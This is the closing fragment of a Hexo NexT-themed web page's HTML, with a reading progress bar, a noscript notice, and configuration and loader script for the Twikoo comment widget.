    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>
<script class="next-config" data-name="twikoo" type="application/json">{"enable":true,"visitor":false,"envId":"https://twikoo.loli.fj.cn","jsUrl":"https://unpkg.com/twikoo@1.6.44/dist/twikoo.min.js","el":"#twikoo-comments"}</script>
<script>
document.addEventListener('page:loaded', () => {
  NexT.utils.loadComments(CONFIG.twikoo.el)
    .then(() => NexT.utils.getScript(
      CONFIG.twikoo.jsUrl || 'https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js',
      { condition: window.twikoo }
    ))
    .then(() => {
      twikoo.init(CONFIG.twikoo);
    });
});
</script>
<style>
.post-block, .comments {
  overflow: visible;
}
.tk-owo-emotion {
  display: inline-block;
}
</style>

</body>
</html>
